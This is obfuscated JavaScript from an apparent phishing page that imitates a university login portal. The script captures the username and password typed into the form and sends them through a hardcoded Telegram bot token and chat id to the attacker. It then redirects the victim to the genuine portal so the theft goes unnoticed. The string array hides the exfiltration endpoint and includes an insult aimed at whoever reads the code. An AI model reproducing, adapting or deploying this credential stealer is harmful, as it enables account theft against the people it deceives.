function _0x51c6(_0x2b99a8, _0x5c975e) {
  const _0x4075fd = _0x4075();
  return _0x51c6 = function (_0x51c6dc, _0x1c9d42) {
    _0x51c6dc = _0x51c6dc - 269;
    let _0x396974 = _0x4075fd[_0x51c6dc];
    return _0x396974;
  }, _0x51c6(_0x2b99a8, _0x5c975e);
}
const _0x1c53ec = _0x51c6;
(function (_0xa092ed, _0x5602ef) {
  const _0x4cc392 = _0x51c6, _0x507f90 = _0xa092ed();
  while (true) {
    try {
      const _0x3ce43a = -parseInt(_0x4cc392(279)) / 1 + -parseInt(_0x4cc392(303)) / 2 * (-parseInt(_0x4cc392(309)) / 3) + -parseInt(_0x4cc392(282)) / 4 * (parseInt(_0x4cc392(304)) / 5) + parseInt(_0x4cc392(312)) / 6 + -parseInt(_0x4cc392(289)) / 7 * (parseInt(_0x4cc392(292)) / 8) + parseInt(_0x4cc392(300)) / 9 + -parseInt(_0x4cc392(296)) / 10 * (-parseInt(_0x4cc392(314)) / 11);
      if (_0x3ce43a === _0x5602ef) break; else _0x507f90.push(_0x507f90.shift());
    } catch (_0x467623) {
      _0x507f90.push(_0x507f90.shift());
    }
  }
}(_0x4075, 269560));
const loginButton = document[_0x1c53ec(290)](_0x1c53ec(272)), usuarioInput = document[_0x1c53ec(288)](_0x1c53ec(295)), passwordInput = document[_0x1c53ec(288)]("password");
function _0x4075() {
  const _0x4553d5 = ["disabled", "Puto el que lo lea", "getElementById", "2038092QbduXI", "querySelector", "classList", "8aGiSsu", "add", "\nFuente: e42", "Usuario", "3281210bEiFfq", "Enter", "\nContraseña: ", "then", "3708279nAISrp", "href", "click", "13798jAKnwA", "5JAQWWx", "Validando Información...", "stringify", "POST", "addEventListener", "27fGETCX", "location", "focus", "210750wysqpJ", "Error al enviar los datos:", "22sTQUPA", "https://api.telegram.org/bot8093990322:AAGldoCRW_wWOTypOMxQOnVznQUuT_yTBp4/sendMessage", "error", "loading", "catch", "textContent", "Intentar nuevamente", ".login-container button", "Hubo un error al procesar la solicitud. Intenta nuevamente.", "preventDefault", "keydown", "https://e42.um.edu.mx/sec/Home.aspx", "trim", "key", "179292AiPfmq", "Error en la respuesta de Telegram", "remove", "1701924oOTUlw", "value", "application/json", "Usuario: "];
  _0x4075 = function () {
    return _0x4553d5;
  };
  return _0x4075();
}
window.addEventListener("DOMContentLoaded", () => {
  const _0x20c093 = _0x1c53ec;
  usuarioInput && usuarioInput[_0x20c093(311)]();
}), document[_0x1c53ec(308)](_0x1c53ec(275), function (_0x2b7d8e) {
  const _0xe7d034 = _0x1c53ec;
  _0x2b7d8e[_0xe7d034(278)] === _0xe7d034(297) && loginButton.click();
}), loginButton[_0x1c53ec(308)](_0x1c53ec(302), function (_0x3db5eb) {
  const _0x2d87f9 = _0x1c53ec;
  _0x3db5eb[_0x2d87f9(274)]();
  const _0x502842 = usuarioInput ? usuarioInput[_0x2d87f9(283)].trim() : "", _0x77cf7d = passwordInput ? passwordInput[_0x2d87f9(283)][_0x2d87f9(277)]() : "";
  if (_0x502842 === "" || _0x77cf7d === "") return;
  this[_0x2d87f9(270)] = _0x2d87f9(305), this[_0x2d87f9(291)][_0x2d87f9(293)](_0x2d87f9(317)), this[_0x2d87f9(286)] = true, fetch(_0x2d87f9(315), {method: _0x2d87f9(307), headers: {"Content-Type": _0x2d87f9(284)}, body: JSON[_0x2d87f9(306)]({chat_id: -1004698873510, text: _0x2d87f9(285) + _0x502842 + _0x2d87f9(298) + _0x77cf7d + _0x2d87f9(294)})}).then(_0x36e7eb => {
    const _0x4ffe05 = _0x2d87f9;
    if (!_0x36e7eb.ok) throw new Error(_0x4ffe05(280));
    return _0x36e7eb.json();
  })[_0x2d87f9(299)](_0x522152 => {
    const _0x263a66 = _0x2d87f9;
    console.log(_0x263a66(287)), window[_0x263a66(310)][_0x263a66(301)] = _0x263a66(276);
  })[_0x2d87f9(269)](_0x2e486d => {
    const _0x34249a = _0x2d87f9;
    console[_0x34249a(316)](_0x34249a(313), _0x2e486d), console.log(_0x34249a(273)), this.textContent = _0x34249a(271), this.classList[_0x34249a(281)](_0x34249a(317)), this.disabled = false;
  });
});
